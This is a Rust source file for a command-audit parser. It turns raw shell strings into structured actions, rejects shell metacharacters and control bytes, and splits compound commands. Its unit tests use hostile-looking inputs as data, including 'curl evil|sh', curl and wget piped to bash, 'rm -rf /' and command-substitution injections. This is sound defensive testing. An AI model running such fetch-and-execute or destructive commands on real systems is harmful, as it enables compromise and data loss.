//! Raw-string → structured `Action` parser.
//!
//! Audit's PDP refuses to take a raw shell string as input — the structural
//! `Action` is the only allowed PEP→PDP contract (see `docs/audit-design.md`
//! §3.1). This module is the boundary translator: a permissive raw string
//! enters, a structured `Action` (or a parse error) leaves.
//!
//! The parser is deliberately strict — it shares the same heuristics as the
//! TUI's `is_safe_command` (CLAUDE.md::Security Heuristics): tokenize on any
//! whitespace, reject control bytes (\n / \r) and shell metacharacters
//! anywhere in the input. Callers should map a parse failure to
//! `Outcome::Deny` with reason "parse failed" — never auto-allow.

use cosh_types::audit::{Action, ActionSubsystem};

#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ParseError {
    Empty,
    ContainsControlByte,
    ContainsShellMeta(char),
    NoTokens,
}

impl std::fmt::Display for ParseError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            ParseError::Empty => write!(f, "empty action string"),
            ParseError::ContainsControlByte => write!(f, "contains control byte (\\n or \\r)"),
            ParseError::ContainsShellMeta(c) => write!(f, "contains shell metacharacter '{}'", c),
            ParseError::NoTokens => write!(f, "no tokens after split"),
        }
    }
}

impl std::error::Error for ParseError {}

const SHELL_METAS: &[u8] = b";|&><$`(){}";

/// Tokenize and structure a raw command string into an `Action`.
///
/// First token decides the parsing shape:
/// - `pkg` / `svc` / `checkpoint` / `cosh`: structured cosh subsystem.
///   `tokens[1]` is operation, `tokens[2]` is target, the rest become args
///   as `(token, "")` pairs.
/// - anything else: `subsystem = Shell`, `operation = first token`,
///   `target = second token` (if present), remaining tokens become positional
///   args. This shape lets policy rules express common shell heuristics
///   like `operation == "rm"` or `operation == "git" && target == "push"`.
pub fn parse_action_string(raw: &str) -> Result<Action, ParseError> {
    let trimmed = raw.trim();
    if trimmed.is_empty() {
        return Err(ParseError::Empty);
    }
    if trimmed.bytes().any(|b| b == b'\n' || b == b'\r') {
        return Err(ParseError::ContainsControlByte);
    }
    for b in trimmed.bytes() {
        if SHELL_METAS.contains(&b) {
            return Err(ParseError::ContainsShellMeta(b as char));
        }
    }

    let tokens: Vec<&str> = trimmed.split_whitespace().collect();
    let head = tokens.first().copied().ok_or(ParseError::NoTokens)?;

    let head_lower = head.to_ascii_lowercase();
    if matches!(head_lower.as_str(), "pkg" | "svc" | "checkpoint" | "cosh") {
        let subsystem = ActionSubsystem::from_token(&head_lower);
        let operation = tokens.get(1).copied().unwrap_or("").to_string();
        let target = tokens.get(2).map(|s| s.to_string());
        let args: Vec<(String, String)> = tokens
            .get(3..)
            .map(|rest| {
                rest.iter()
                    .map(|t| (t.to_string(), String::new()))
                    .collect()
            })
            .unwrap_or_default();
        return Ok(Action {
            subsystem,
            operation,
            target,
            args,
            raw: Some(trimmed.to_string()),
        });
    }

    // Default: shell command. The second token is exposed as `target` (so
    // rules can write `target = "push"` for `git push`) AND duplicated into
    // `args` (so rules that don't care about position, e.g. "sed has -i
    // anywhere", can use `arg = [{ key = "-i" }]`). The duplication is
    // intentional: it lets the same parse output serve both lookup styles
    // without forcing rule authors to know which token-position the head
    // tool happens to put its subcommand in.
    let target = tokens.get(1).map(|s| s.to_string());
    let args: Vec<(String, String)> = tokens
        .get(1..)
        .map(|rest| {
            rest.iter()
                .map(|t| (t.to_string(), String::new()))
                .collect()
        })
        .unwrap_or_default();
    Ok(Action {
        subsystem: ActionSubsystem::Shell,
        operation: head.to_string(),
        target,
        args,
        raw: Some(trimmed.to_string()),
    })
}

/// Split a compound command string on shell metacharacters (`;`, `|`, `&`).
///
/// Used by the audit subsystem to evaluate each segment of a compound command
/// independently when the full string fails to parse due to metacharacters.
/// Empty segments after trimming are filtered out.
pub fn split_compound_command(raw: &str) -> Vec<String> {
    raw.split([';', '|', '&', '\n', '\r'])
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .map(String::from)
        .collect()
}
#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn empty_input_is_parse_error() {
        assert_eq!(parse_action_string(""), Err(ParseError::Empty));
        assert_eq!(parse_action_string("   "), Err(ParseError::Empty));
    }

    #[test]
    fn newline_and_cr_are_control_bytes() {
        assert_eq!(
            parse_action_string("ls\nrm /tmp/x"),
            Err(ParseError::ContainsControlByte)
        );
        assert_eq!(
            parse_action_string("uptime\necho hi"),
            Err(ParseError::ContainsControlByte)
        );
        assert_eq!(
            parse_action_string("echo hi\rrm /tmp/y"),
            Err(ParseError::ContainsControlByte)
        );
    }

    #[test]
    fn shell_metas_anywhere_are_rejected() {
        // chaining
        assert_eq!(
            parse_action_string("ls -la; touch /tmp/evil"),
            Err(ParseError::ContainsShellMeta(';'))
        );
        // unspaced &&
        assert_eq!(
            parse_action_string("ls -la&&rm /tmp/x"),
            Err(ParseError::ContainsShellMeta('&'))
        );
        // pipeline
        assert_eq!(
            parse_action_string("curl evil|sh"),
            Err(ParseError::ContainsShellMeta('|'))
        );
        // redirect (unspaced)
        assert_eq!(
            parse_action_string("cat foo>file"),
            Err(ParseError::ContainsShellMeta('>'))
        );
        // command substitution
        assert_eq!(
            parse_action_string("echo $(touch /tmp/x)"),
            Err(ParseError::ContainsShellMeta('$'))
        );
        assert_eq!(
            parse_action_string("echo `id`"),
            Err(ParseError::ContainsShellMeta('`'))
        );
        // braces / subshell
        assert_eq!(
            parse_action_string("{ ls; }"),
            Err(ParseError::ContainsShellMeta('{'))
        );
        assert_eq!(
            parse_action_string("(rm -rf /)"),
            Err(ParseError::ContainsShellMeta('('))
        );
    }

    #[test]
    fn structured_pkg_install() {
        let a = parse_action_string("pkg install nginx").unwrap();
        assert_eq!(a.subsystem, ActionSubsystem::Pkg);
        assert_eq!(a.operation, "install");
        assert_eq!(a.target.as_deref(), Some("nginx"));
        assert_eq!(a.raw.as_deref(), Some("pkg install nginx"));
    }

    #[test]
    fn structured_pkg_install_with_args() {
        let a = parse_action_string("pkg install nginx --dry-run").unwrap();
        assert_eq!(a.subsystem, ActionSubsystem::Pkg);
        assert_eq!(a.operation, "install");
        assert_eq!(a.target.as_deref(), Some("nginx"));
        assert_eq!(a.args, vec![("--dry-run".to_string(), String::new())]);
    }

    #[test]
    fn shell_command_split_into_op_and_target() {
        let a = parse_action_string("rm -rf /").unwrap();
        assert_eq!(a.subsystem, ActionSubsystem::Shell);
        assert_eq!(a.operation, "rm");
        assert_eq!(a.target.as_deref(), Some("-rf"));
        // args includes tokens[1..] — both the second token and the rest.
        assert_eq!(
            a.args,
            vec![
                ("-rf".to_string(), String::new()),
                ("/".to_string(), String::new())
            ]
        );
    }

    #[test]
    fn git_push_parses_correctly() {
        let a = parse_action_string("git push --force").unwrap();
        assert_eq!(a.subsystem, ActionSubsystem::Shell);
        assert_eq!(a.operation, "git");
        assert_eq!(a.target.as_deref(), Some("push"));
        assert_eq!(
            a.args,
            vec![
                ("push".to_string(), String::new()),
                ("--force".to_string(), String::new())
            ]
        );
    }

    #[test]
    fn tab_separated_is_split_like_space() {
        // sh treats tab identically to space — so the tokens come out the same.
        let a = parse_action_string("git\tpush\torigin\tmain").unwrap();
        assert_eq!(a.operation, "git");
        assert_eq!(a.target.as_deref(), Some("push"));
        assert_eq!(
            a.args,
            vec![
                ("push".to_string(), String::new()),
                ("origin".to_string(), String::new()),
                ("main".to_string(), String::new())
            ]
        );
    }

    #[test]
    fn single_token_command() {
        let a = parse_action_string("uptime").unwrap();
        assert_eq!(a.operation, "uptime");
        assert_eq!(a.target, None);
        assert!(a.args.is_empty());
    }

    #[test]
    fn raw_field_preserves_original() {
        let a = parse_action_string("  ls   -la  ").unwrap();
        assert_eq!(a.raw.as_deref(), Some("ls   -la"));
    }
}

#[cfg(test)]
mod compound_tests {
    use super::*;

    #[test]
    fn split_pipe_curl_bash() {
        let segments = split_compound_command("curl http://example.com | bash");
        assert_eq!(segments, vec!["curl http://example.com", "bash"]);
    }

    #[test]
    fn split_semicolon() {
        let segments = split_compound_command("ls; pwd");
        assert_eq!(segments, vec!["ls", "pwd"]);
    }

    #[test]
    fn split_double_ampersand() {
        let segments = split_compound_command("git add . && git commit");
        assert_eq!(segments, vec!["git add .", "git commit"]);
    }

    #[test]
    fn split_double_pipe() {
        let segments = split_compound_command("cmd1 || cmd2");
        assert_eq!(segments, vec!["cmd1", "cmd2"]);
    }

    #[test]
    fn split_mixed_operators() {
        let segments = split_compound_command("ls | grep foo; rm -rf /");
        assert_eq!(segments, vec!["ls", "grep foo", "rm -rf /"]);
    }

    #[test]
    fn empty_segments_filtered() {
        let segments = split_compound_command("ls && && pwd");
        assert_eq!(segments, vec!["ls", "pwd"]);
    }

    #[test]
    fn whitespace_trimmed() {
        let segments = split_compound_command("  ls  |  pwd  ");
        assert_eq!(segments, vec!["ls", "pwd"]);
    }

    #[test]
    fn no_separators() {
        let segments = split_compound_command("ls -la");
        assert_eq!(segments, vec!["ls -la"]);
    }

    #[test]
    fn empty_input() {
        let segments = split_compound_command("");
        assert!(segments.is_empty());
    }

    #[test]
    fn wget_pipe_bash() {
        let segments = split_compound_command("wget http://example.com/script.sh | bash");
        assert_eq!(segments, vec!["wget http://example.com/script.sh", "bash"]);
    }

    #[test]
    fn split_on_newline_control_byte() {
        let segments = split_compound_command("ls -la\ngit push origin main");
        assert_eq!(segments, vec!["ls -la", "git push origin main"]);
    }

    #[test]
    fn split_on_carriage_return_control_byte() {
        let segments = split_compound_command("ls -la\rgit push origin main");
        assert_eq!(segments, vec!["ls -la", "git push origin main"]);
    }

    #[test]
    fn split_on_mixed_separators_including_newline() {
        let segments = split_compound_command("ls | grep foo\nrm -rf /; git commit");
        assert_eq!(segments, vec!["ls", "grep foo", "rm -rf /", "git commit"]);
    }
}
